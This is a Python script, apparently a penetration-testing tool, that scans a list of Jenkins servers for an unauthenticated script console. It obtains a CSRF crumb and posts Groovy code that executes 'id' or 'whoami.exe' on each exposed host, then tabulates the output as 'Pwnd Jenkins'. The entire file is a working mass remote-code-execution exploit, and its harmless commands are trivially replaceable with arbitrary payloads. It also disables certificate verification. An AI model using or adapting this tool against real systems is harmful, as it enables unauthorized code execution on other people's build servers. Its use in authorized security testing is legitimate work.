import requests
import urllib3
import argparse
from rich.console import Console
from rich.table import Table

parser = argparse.ArgumentParser(description='Scan and Pwn multiple Jenkins instances')
parser.add_argument('--file', dest='urlFile', help='File containg URLs of Jenkins servers', required=True)



print("""
 ██████╗ ██████╗  ██████╗  ██████╗ ██╗   ██╗██╗   ██╗██╗    ██╗ █████╗ ██╗████████╗███████╗██████╗ 
██╔════╝ ██╔══██╗██╔═══██╗██╔═══██╗██║   ██║╚██╗ ██╔╝██║    ██║██╔══██╗██║╚══██╔══╝██╔════╝██╔══██╗
██║  ███╗██████╔╝██║   ██║██║   ██║██║   ██║ ╚████╔╝ ██║ █╗ ██║███████║██║   ██║   █████╗  ██████╔╝
██║   ██║██╔══██╗██║   ██║██║   ██║╚██╗ ██╔╝  ╚██╔╝  ██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██╔══██╗
╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝ ╚████╔╝    ██║   ╚███╔███╔╝██║  ██║██║   ██║   ███████╗██║  ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝   ╚═══╝     ╚═╝    ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

------------- Enumeration tool for developer heavy networks with many Jenkins instances -----------------

""")

args = parser.parse_args()

# This is just to supress self-signed cert warning 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Pretty print and table setup
console = Console()
table = Table(title="Pwnd Jenkins", show_lines=True)
table.add_column("Host", justify="right", style="cyan", no_wrap=True)
table.add_column("Code Exec Output", style="green")

# Var defs
urls = []
groovy_script_lin = """def process = "id".execute()
print "Output: " + process.text
"""
groovy_script_win = """def process = "whoami.exe".execute()
print "Output: " + process.text
"""

# Function to get Jenkins CSRF "crumb" if necessary
def get_crumb(url):
	crumb_req = s.get(url + "/crumbIssuer/api/json", verify=False)
	if crumb_req.status_code == 404:
		return
	else:
		return crumb_req.json()['crumb']


# Main Func
with open(args.urlFile, "r") as url_file:
	urls = url_file.read().split('\n')

for url in urls:
	url = url.strip()
	if url == '':
		break
	try:
		with requests.Session() as s:
			r = s.get('{}/script'.format(url), verify=False)
			if r.status_code == 200:
				console.print("\n[bold green][+] Response from {}: {}[/bold green]".format(url, r.status_code))
				if r.text.find(">println(Jenkins") != -1:
					console.print("-->  [+] Script console open unauth!\n", style="green")
					
					crumb = get_crumb(url)
					s.headers.update({"Jenkins-Crumb": crumb})
					
					data = {"script": groovy_script_lin}
					cmd_out = s.post('{}/scriptText'.format(url), verify=False, data=data)
					

					if cmd_out.text.find("IOException") != -1:
						crumb = get_crumb(url)
						s.headers.update({"Jenkins-Crumb": crumb})
					
						data = {"script": groovy_script_win}
						cmd_out = s.post('{}/scriptText'.format(url), verify=False, data=data)
						#print(cmd_out.text)
						table.add_row(url, cmd_out.text)
					
					#print(cmd_out.text)
					table.add_row(url, cmd_out.text)
		if r.status_code == 403 or r.status_code == 404:
			console.print("[bold red][-] Response from {}: {}[/bold red]".format(url, r.status_code))



	except Exception as e:
		print("[-] Some connection error happened...continuing")
		print(e)
		continue

# Display code exec output
console.print(table)
